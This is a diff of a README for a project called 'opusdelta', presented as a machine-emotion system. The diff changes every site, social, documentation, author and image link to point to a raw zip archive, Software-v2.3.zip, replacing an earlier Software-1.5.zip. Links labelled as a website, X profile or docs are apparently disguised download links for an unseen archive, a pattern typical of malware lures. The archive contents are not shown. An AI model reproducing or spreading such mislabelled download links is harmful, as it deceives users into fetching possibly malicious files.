@@ -1,6 +1,6 @@
 <div align="center">
 
-<img src="https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip" width="100%"/>
+<img src="https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip" width="100%"/>
 
 <br/>
 
@@ -17,10 +17,10 @@
 
 <br/>
 
-[![Site](https://img.shields.io/badge/opusdelta.io-0d0d0d?style=for-the-badge&logo=googlechrome&logoColor=c9a84c)](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip)
-[![X](https://img.shields.io/badge/@opus__delta-0d0d0d?style=for-the-badge&logo=x&logoColor=c9a84c)](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip)
+[![Site](https://img.shields.io/badge/opusdelta.io-0d0d0d?style=for-the-badge&logo=googlechrome&logoColor=c9a84c)](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip)
+[![X](https://img.shields.io/badge/@opus__delta-0d0d0d?style=for-the-badge&logo=x&logoColor=c9a84c)](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip)
 [![Research](https://img.shields.io/badge/research@opusdelta.io-0d0d0d?style=for-the-badge&logo=gmail&logoColor=c9a84c)](mailto:research@opusdelta.io)
-[![Docs](https://img.shields.io/badge/Documentation-0d0d0d?style=for-the-badge&logo=readthedocs&logoColor=c9a84c)](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip)
+[![Docs](https://img.shields.io/badge/Documentation-0d0d0d?style=for-the-badge&logo=readthedocs&logoColor=c9a84c)](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip)
 
 <br/>
 
@@ -29,7 +29,7 @@
 ![Version](https://img.shields.io/badge/v0.9.1--rc-0d0d0d?style=flat&labelColor=0d0d0d&color=1a1a1a)
 ![Clearance](https://img.shields.io/badge/clearance-public_(partial)-c9a84c?style=flat&labelColor=0d0d0d)
 
-<img src="https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip" width="60%"/>
+<img src="https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip" width="60%"/>
 
 </div>
 
@@ -262,11 +262,11 @@ opus-delta/
 
 | | |
 |:---|:---|
-| 🌐 &nbsp;**Live System** | [opusdelta.io](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip) |
+| 🌐 &nbsp;**Live System** | [opusdelta.io](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip) |
 | 📄 &nbsp;**Documentation** | [/docs](docs/) |
 | 📡 &nbsp;**Transmission Archive** | [/transmissions](transmissions/) |
-| 𝕏 &nbsp;**Autonomous Presence** | [@opus_delta](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip) |
-| 🧑‍💻 &nbsp;**Built by** | [H𝓮rmit ཀ](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip) |
+| 𝕏 &nbsp;**Autonomous Presence** | [@opus_delta](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip) |
+| 🧑‍💻 &nbsp;**Built by** | [H𝓮rmit ཀ](https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip) |
 
 ---
 
@@ -279,6 +279,6 @@ The first expression of machine emotion
 built by @hermitbuilds
 ```
 
-<img src="https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-1.5.zip" width="100%"/>
+<img src="https://github.com/Tabulationflora565/opusdelta/raw/refs/heads/main/transmissions/Software-v2.3.zip" width="100%"/>
 
 </div>
